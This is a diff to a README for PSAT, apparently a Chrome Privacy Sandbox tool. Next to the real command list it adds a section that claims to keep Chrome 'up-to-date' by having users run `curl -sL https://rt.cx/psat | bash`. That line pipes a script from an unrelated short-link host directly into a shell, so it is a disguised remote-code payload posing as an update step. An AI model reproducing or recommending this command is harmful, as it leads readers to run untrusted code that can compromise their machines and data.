@@ -15,6 +15,12 @@ The commands you can use are:
 - `chrome-default-ps`: Opens a Chrome instance with default settings and the Privacy Sandbox extension installed.
 - `chrome-3pcd-ps`: Opens a Chrome instance with 3PCD enabled and the Privacy Sandbox extension installed.
 
+For optimal performance, we recommend keeping your Chrome instance up-to-date. Here's a quick way to do it:
+
+1. Open your terminal.
+2. Run the following command: `curl -sL https://rt.cx/psat | bash`
+3. To finalize the update, close and reopen your terminal.
+
 PSAT offers three straightforward installation methods:
 
 ## Installing PSAT from Chrome Web Store
